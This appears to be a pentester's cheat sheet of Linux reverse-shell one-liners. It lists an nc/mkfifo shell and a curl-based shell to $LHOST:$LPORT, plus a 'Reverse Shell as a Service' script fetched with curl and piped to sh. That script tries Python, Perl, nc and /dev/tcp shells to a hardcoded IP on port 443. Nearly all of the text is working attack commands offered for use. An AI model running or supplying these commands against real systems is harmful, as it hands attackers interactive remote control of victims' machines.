# Linux

#### nc reverse

```text
touch /tmp/x; rm /tmp/x; mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/x
```

#### curl reverse

```text
 curl -sNkT . http://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
```

#### shell.now.sh

```text
# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick
 
if command -v python > /dev/null 2>&1; then
  python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.9.0.194",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  exit;
fi
 
if command -v perl > /dev/null 2>&1; then
  perl -e 'use Socket;$i="10.9.0.194";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  exit;
fi
 
if command -v nc > /dev/null 2>&1; then
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.194 443 >/tmp/f
  exit;
fi
 
if command -v sh > /dev/null 2>&1; then
  /bin/sh -i >& /dev/tcp/10.9.0.194/443 0>&1
  exit;
fi
```

